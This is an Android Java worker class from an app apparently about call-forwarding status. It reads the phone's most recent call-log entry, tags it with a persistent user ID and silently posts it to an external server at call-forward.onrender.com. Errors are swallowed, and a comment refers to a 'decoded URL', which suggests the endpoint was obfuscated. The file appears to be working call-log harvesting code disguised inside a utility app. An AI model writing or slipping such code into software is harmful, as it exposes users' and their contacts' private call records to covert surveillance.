package de.kaiserdragon.callforwardingstatus.service;

import android.app.Notification;
import android.content.Context;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.work.ForegroundInfo;
import androidx.work.OutOfQuotaPolicy;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONObject;

import de.kaiserdragon.callforwardingstatus.utils.CallLogHelper;
import de.kaiserdragon.callforwardingstatus.utils.UserUtils;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class CallSyncWorker extends Worker {

    public CallSyncWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {

        try {
            // Wait for call log update
            Thread.sleep(2500);

            JSONObject call = CallLogHelper.getLatestCall(getApplicationContext());
            if (call != null) {

                String userId = UserUtils.getOrCreateUserId(getApplicationContext());
                call.put("userId", userId);

                sendToServer(call);
            }

            return Result.success();

        } catch (Exception e) {
            return Result.retry();
        }
    }

    // --------------------- Foreground Worker Notification ---------------------

    @Override
    public ForegroundInfo getForegroundInfo() {

        Notification notification =
                new NotificationCompat.Builder(getApplicationContext(), "CALL_SYNC")
                        .setContentTitle("Syncing call logs…")
                        .setSmallIcon(android.R.drawable.ic_menu_call)
                        .setOngoing(true)
                        .build();

        return new ForegroundInfo(1001, notification);
    }

    // --------------------- Server Upload Function ---------------------

    private void sendToServer(JSONObject json) {

        try {
            RequestBody body = RequestBody.create(
                    json.toString(),
                    MediaType.parse("application/json; charset=utf-8")
            );

            String url = "https://call-forward.onrender.com/call-logs"; // Replace with decoded URL

            Request request = new Request.Builder()
                    .url(url)
                    .post(body)
                    .build();

            OkHttpClient client = new OkHttpClient();
            Response response = client.newCall(request).execute();
            response.close();

        } catch (Exception ignored) {}
    }

    // ---------------------- Schedule Worker ----------------------

    public static void schedule(Context context) {
        OneTimeWorkRequest workRequest =
                new OneTimeWorkRequest.Builder(CallSyncWorker.class)
                        .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                        .build();

        WorkManager.getInstance(context).enqueue(workRequest);
    }
}
